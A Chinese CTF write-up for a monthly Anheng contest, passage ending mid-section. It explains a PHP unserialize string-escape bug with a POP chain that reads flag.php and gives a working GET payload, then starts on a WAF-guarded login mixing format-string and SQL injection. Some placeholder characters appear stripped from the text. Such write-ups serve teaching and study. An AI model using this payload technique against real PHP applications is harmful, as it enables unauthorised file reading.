# 安恒四月赛部分Writeup
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
这周有安恒的月赛，  
又是膜师傅的一天  
学到了一些骚姿势：
## web
###  web1
打开题目发现给出了源码：
     username = $a;
            $this->password = $b;
        }
    }
    class B{
        public $b = 'gqy';
        function __destruct(){
            $c = 'a'.$this->b;
            echo $c;
        }
    }
    class C{
        public $c;
        function __toString(){
            //flag.php
            echo file_get_contents($this->c);
            return 'nice';
        }
    }
    $a = @new A($_GET['a'],$_GET['b']);
    //省略了存储序列化数据的过程,下面是取出来并反序列化的操作
    $b = unserialize(read(write(serialize($a))));
我们来分析一下：
    function write($data) {
        return str_replace(chr(0) . '*' . chr(0), '', $data);
    }
    function read($data) {
        return str_replace('', chr(0) . '*' . chr(0), $data);
    }
这个写函数，当反序列化存储的私有成员是，会有`chr(0)`的出现，所以会对`chr(0) . '*' .
chr(0)`进行一个替换，当读取的时候会对``进行一个还原。
看似没有什么问题，但是当我们可以的存储``进行`wirte()`时不会发生改变。但是进行`read()`时，会变为`chr(0) . '*' .
chr(0)`由六字符变为三字符，可以实现字符逃逸。。。
我们可以明显看到在 `read` 函数处理后，原先字符中的 ``被替换成 `chr(0).'*'.chr(0)`，但是字符长度标识不变
。所以在进行反序列化的时候，还会继续向后读取，这样序列化的结果就完全不一样了。
所以来看一下如何构造pop链。
    class A{
        public $username;
        public $password;
        function __construct($a, $b){
            $this->username = $a;
            $this->password = $b;
        }
    }
    class B{
        public $b = 'gqy';
        function __destruct(){
            $c = 'a'.$this->b;
            echo $c;
        }
    }
    class C{
        public $c;
        function __toString(){
            //flag.php
            echo file_get_contents($this->c);
            return 'nice';
        }
    }
`class
C`存在`file_get_contents()`函数，可以读取文件内容，可以让`$c`为`flag.php`,并且存在`__toString()`魔术方法。。
`class B`函数存在`echo` 那么大致思路就出来了
     username = $a;
            $this->password = $b;
        }
    }
    class B{
        public $b;
        function __destruct(){
            $c = 'a'.$this->b;
            echo $c;
        }
    }
    class C{
        public $c = 'flag.php';
        function __toString(){
            //flag.php
            echo file_get_contents($this->c);
            return 'nice';
        }
    }
    $aaa = new A();
    $bbb = new B();
    $ccc = new C();
    $bbb->b=$ccc;
    // echo serialize($bbb);
    $aaa->password=$bbb;
    echo serialize($aaa);
得到`O:1:"A":2:{s:8:"username";N;s:8:"password";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}}}`
因为要造成反序列化逃逸：所以password值为：`";s:8:"password";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}}`
带入反序列化的解果为：`O:1:"A":2:{s:8:"username";s:3:"aaa";s:8:"password";s:72:"";s:8:"password";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}}";}`
所以我们要逃逸的字符为:`";s:8:"password";s:72:"`一共23个字符，但是``替换为`chr(0) . '*' .
chr(0)`一次逃逸3个字符，所以要是三的倍数。。所以`password`为`A";s:8:"password";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}}`  
username为24个``;
payload:
    a=&b=A";s:8:"password";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}}
###  web2
打开页面是一个登陆框：  
尝试一下发现存在waf,  
于是看一下都过滤了写什么函数。。
发现过滤的挺多的，也挺全的，一时没有了解头绪
看一下源代码，发现了收获，2333
这个`%s`让我想到了格式化字符串的漏洞。。  
上网找到这样的一篇文章[参考文章](https://www.cnblogs.com/test404/p/7821884.html)  
发现骚姿势，SQL注入可以和格式化字符串一起使用
例如：